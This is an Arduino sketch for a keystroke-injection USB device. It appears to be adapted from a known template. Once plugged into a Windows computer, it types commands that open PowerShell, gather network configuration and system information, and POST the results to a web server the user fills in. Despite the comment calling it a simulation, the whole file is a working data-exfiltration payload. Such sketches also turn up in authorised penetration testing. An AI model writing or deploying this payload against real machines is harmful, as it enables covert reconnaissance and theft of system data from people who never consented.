// Modified version of a keyboard injection sketch that simulates network and system info exfiltration via PowerShell

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(500);

  openRunDialog();
  typeText("cmd");
  sendEnter();
  delay(1000);

  typeText("powershell");
  sendEnter();
  delay(500);

  typeText("$network=ipconfig");
  sendEnter();
  delay(300);

  typeText("$system=systeminfo");
  sendEnter();
  delay(1000);

  typeText("$payload=$network+$system");
  sendEnter();
  delay(300);

  //Replace everyting including brackets "[]" with your own URL
  typeText("$target=\"[YOUR_OWN_WEBSERVER_URL]\"");
  sendEnter();
  delay(300);

  typeText("$body=\"ip=\"+$payload");
  sendEnter();
  delay(300);

  typeText("Invoke-WebRequest -Uri $target -Method POST -Body $body -ContentType \"application/x-www-form-urlencoded\" -UseBasicParsing");
  sendEnter();
  delay(1000);

  typeText("exit");
  sendEnter();
  Keyboard.end();
}

void loop() {
  // No loop actions required for one-time payload
}

// Function to simulate pressing ENTER
void sendEnter() {
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
}

// Function to simulate pressing ALT + F4 (not used here, utility only)
void closeWindow() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.releaseAll();
  delay(500);
}

// Function to type a given text string
void typeText(const char *text) {
  Keyboard.print(text);
  delay(500);
}

// Function to open Windows Run dialog using GUI + R
void openRunDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
}
